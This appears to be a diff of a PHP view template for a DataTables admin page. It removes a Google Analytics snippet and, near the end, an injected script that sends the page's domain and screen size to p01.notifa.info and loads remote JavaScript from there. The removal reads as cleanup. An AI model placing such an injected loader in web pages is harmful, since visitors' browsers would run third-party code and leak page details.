@@ -22,20 +22,6 @@
 
   <link href="<?php echo base_url('assets/template/vendors/css/dataTables.bootstrap4.min.css'); ?>" rel="stylesheet">
   <!-- Styles required by this views -->
-  <script>
-    (function(i, s, o, g, r, a, m) {
-      i['GoogleAnalyticsObject'] = r;
-      i[r] = i[r] || function() {
-        (i[r].q = i[r].q || []).push(arguments)
-      }, i[r].l = 1 * new Date();
-      a = s.createElement(o), m = s.getElementsByTagName(o)[0];
-      a.async = 1;
-      a.src = g;
-      m.parentNode.insertBefore(a, m)
-    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
-    ga('create', 'UA-9510961-27', 'auto');
-    ga('send', 'pageview');
-  </script>
   <script type="text/javascript">
       setTimeout(function() {
           $('#not').fadeOut('slow');
@@ -422,7 +408,6 @@
 
 <script src="<?php echo base_url('assets/template/js/views/datatables.js'); ?>"></script>
 <script src="<?php echo base_url('assets/template/js/views/main.js'); ?>"></script>
-  
-  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mFebPgNN5rVLezV543wMEyRgbHBzhi%2fK7MWPN24sfC3qOxdbli7TMUGzXH1Sdhp9LTsjainPghxAbWmtT77jaOuH%2flN3JJNWA5YmapY0%2fQoDnxlpb4Yo7Q162lyUUuSSL6EDglhF3dKSaYBObyqaTG2G8GNlp%2bm6ki4D3qgWAoL%2fjgkM6B94yAdLDx1kEwBwhpVxs69lLL8HIMrZvxEFPPjOq6mZ4G9lE3wMOanQ3OrWai1QlTC1HLTqFnqOfvPSV%2bCeTd61PgeB0jaUiWTdUx%2fXcwfQR5EWaDUr7sMaUN5sUKqcpMEANY37SmdNm%2bDq3a8mD1%2fTO7fFd7eKO74txijp9ndyO2p514NmVBSlgbZ9aq%2bcv3uYZC9aAMBKIsOepSuA7%2fUOQWVPF9xqNHatvUL9dgZACrHQcLlcjAQGth3KPtZO7H5eRiEGHMLunmOiQWkaV71%2fW0ElFv6jkQMHC1wWKxOxX0d9pZdeONMPJ%2bltsy3iw%2buHSsiHBSDjzshTXoPXSrV9AIEYNhwLgW9WnSJjDkE7Ibuuqs8nLHS%2bqcNYJExR6ibOcRQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
 </body>
 </html>
